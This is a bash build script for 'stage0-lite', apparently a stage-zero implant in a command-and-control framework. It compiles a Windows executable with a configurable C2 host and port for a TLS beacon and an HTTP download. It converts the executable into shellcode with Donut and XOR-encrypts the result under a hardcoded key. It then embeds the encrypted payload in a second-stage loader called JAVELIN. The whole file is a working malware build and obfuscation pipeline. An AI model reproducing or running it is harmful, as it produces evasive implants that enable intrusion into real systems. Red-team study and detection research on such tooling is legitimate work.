#!/usr/bin/env bash
# build.sh — Build stage0-lite shellcode
#
# Pipeline:
#   1.  Compile stage0_lite.c → stage0_lite.exe (mingw-w64, -Os)
#   2.  Convert exe → shellcode with Donut v1.1
#   3.  XOR-encrypt shellcode for embedding in JAVELIN
#   4.  Copy artefacts to dist/
#
# Usage:
#   ./build.sh --ip 192.168.1.10 --port 4444
#   ./build.sh --ip 10.0.0.1 --port 443 --production
#
# Output (relative to repo root):
#   dist/stage0_lite.exe          non-stripped exe (debug reference)
#   dist/stage0_lite.bin          raw Donut shellcode
#   dist/stage0_lite.bin.enc      XOR-encrypted shellcode (embedded by JAVELIN)
#
# Dependencies on host:
#   x86_64-w64-mingw32-gcc        (mingw-w64)
#   donut                         (donut_v1.1/donut or donut in PATH)
#   python3                       (for XOR encrypt step)

set -euo pipefail

# ---- Parse arguments ----
C2_IP="CHANGEME_C2_HOST"
C2_PORT="4444"
API_PORT="5555"
PRODUCTION=0

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)        C2_IP="$2";      shift 2 ;;
        --port)      C2_PORT="$2";    shift 2 ;;
        --api-port)  API_PORT="$2";   shift 2 ;;
        --production) PRODUCTION=1;   shift   ;;
        -h|--help)
            echo "Usage: $0 --ip <C2_IP> --port <C2_PORT> [--api-port <API_PORT>] [--production]"
            exit 0 ;;
        *) echo "Unknown arg: $1"; exit 1 ;;
    esac
done

# ---- Locate repo root (script is in stages/stage0-lite/) ----
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"

echo "╔══════════════════════════════════════════╗"
echo "║    stage0-lite Builder                   ║"
echo "╚══════════════════════════════════════════╝"
echo " C2 Host  : ${C2_IP}"
echo " C2 Port  : ${C2_PORT}  (TLS beacon)"
echo " API Port : ${API_PORT} (HTTP download)"
echo " Mode     : $([ $PRODUCTION -eq 1 ] && echo 'PRODUCTION' || echo 'DEV')"
echo ""

cd "${SCRIPT_DIR}"
mkdir -p build

# ---- Step 1: Compile ----
echo "[1/4] Compiling stage0_lite.exe with mingw-w64..."

MAKE_ARGS="C2_HOST=${C2_IP} C2_PORT=${C2_PORT} API_PORT=${API_PORT}"
if [ $PRODUCTION -eq 1 ]; then
    MAKE_ARGS="${MAKE_ARGS} PRODUCTION=1"
fi
make clean >/dev/null 2>&1 || true
make ${MAKE_ARGS}

EXE_PATH="${SCRIPT_DIR}/build/stage0_lite.exe"
EXE_SIZE=$(du -k "${EXE_PATH}" | cut -f1)
echo "   → ${EXE_PATH} (${EXE_SIZE} KB)"

# ---- Step 2: Donut → shellcode ----
echo ""
echo "[2/4] Converting to PIC shellcode with Donut..."

# Find donut — native binary first, then wine fallback
DONUT_CMD=""

# 1. Native Linux donut binary
for candidate in \
    "${REPO_ROOT}/donut_v1.1/donut" \
    "donut" \
    "/usr/local/bin/donut" ; do
    if [ -x "${candidate}" ] || command -v "${candidate}" &>/dev/null; then
        DONUT_CMD="${candidate}"
        break
    fi
done

# 2. Wine wrapper around the bundled donut.exe
if [ -z "${DONUT_CMD}" ]; then
    DONUT_EXE="${REPO_ROOT}/donut_v1.1/donut.exe"
    if [ -f "${DONUT_EXE}" ] && command -v wine &>/dev/null; then
        echo "   ℹ️  Using 'wine donut.exe' (no native Linux donut found)"
        DONUT_CMD="wine ${DONUT_EXE}"
    fi
fi

# 3. Try to build from source
if [ -z "${DONUT_CMD}" ] && [ -d "${REPO_ROOT}/donut_v1.1" ]; then
    echo "⚠️  Attempting to build donut from source..."
    (cd "${REPO_ROOT}/donut_v1.1" && make 2>/dev/null)
    if [ -f "${REPO_ROOT}/donut_v1.1/donut" ]; then
        DONUT_CMD="${REPO_ROOT}/donut_v1.1/donut"
    fi
fi

if [ -z "${DONUT_CMD}" ]; then
    echo "❌ ERROR: donut not found. Install wine or put native donut in PATH."
    exit 1
fi

SC_PATH="${SCRIPT_DIR}/build/stage0_lite.bin"
# shellcheck disable=SC2086
${DONUT_CMD} \
    -i "${EXE_PATH}" \
    -o "${SC_PATH}" \
    -a 2  \
    -f 1  \
    -x 2  \
    -e 3  \
    -t

SC_SIZE=$(du -k "${SC_PATH}" | cut -f1)
echo "   → ${SC_PATH} (${SC_SIZE} KB)"

# ---- Step 3: XOR encrypt for JAVELIN embedding ----
echo ""
echo "[3/4] XOR encrypting shellcode for JAVELIN..."

ENCRYPTED_PATH="${SCRIPT_DIR}/build/stage0_lite.bin.enc"

# The XOR key MUST match JAVELIN_STAGE0_XOR_KEY in stage_builder.rs
XOR_KEY="C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"

python3 - <<PYEOF
import sys, os

key = b"${XOR_KEY}"
sc_path = "${SC_PATH}"
enc_path = "${ENCRYPTED_PATH}"

with open(sc_path, "rb") as f:
    data = f.read()

encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

with open(enc_path, "wb") as f:
    f.write(encrypted)

print(f"   Input  : {len(data)} bytes")
print(f"   Output : {len(encrypted)} bytes")
PYEOF

ENC_SIZE=$(du -k "${ENCRYPTED_PATH}" | cut -f1)
echo "   → ${ENCRYPTED_PATH} (${ENC_SIZE} KB)"

# ---- Step 4: Copy to dist/ ----
echo ""
echo "[4/4] Copying artefacts to dist/..."

DIST_DIR="${REPO_ROOT}/dist"
mkdir -p "${DIST_DIR}"

cp "${EXE_PATH}"       "${DIST_DIR}/stage0_lite.exe"
cp "${SC_PATH}"        "${DIST_DIR}/stage0_lite.bin"
cp "${ENCRYPTED_PATH}" "${DIST_DIR}/stage0_lite.bin.enc"

# Also copy to the JAVELIN src dir so include_bytes! can find it during compilation
# Path: stages/javelin/src/stage0_payload.bin
JAVELIN_PAYLOAD="${REPO_ROOT}/stages/javelin/src/stage0_payload.bin"
cp "${ENCRYPTED_PATH}" "${JAVELIN_PAYLOAD}"

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║    stage0-lite build complete!           ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo " Artefacts:"
echo "   dist/stage0_lite.exe     : ${EXE_SIZE} KB  (EXE for debug)"
echo "   dist/stage0_lite.bin     : ${SC_SIZE} KB   (raw shellcode)"
echo "   dist/stage0_lite.bin.enc : ${ENC_SIZE} KB  (XOR-encrypted, for JAVELIN)"
echo "   stages/javelin/src/stage0_payload.bin : copied ✓"
echo ""

if [ "${SC_SIZE}" -gt 200 ]; then
    echo "⚠️  WARNING: shellcode is ${SC_SIZE} KB (target is <200 KB)"
    echo "   Consider reducing dependencies or enabling link-time optimisation."
else
    echo "✅ Size check passed: ${SC_SIZE} KB < 200 KB target"
fi
echo ""
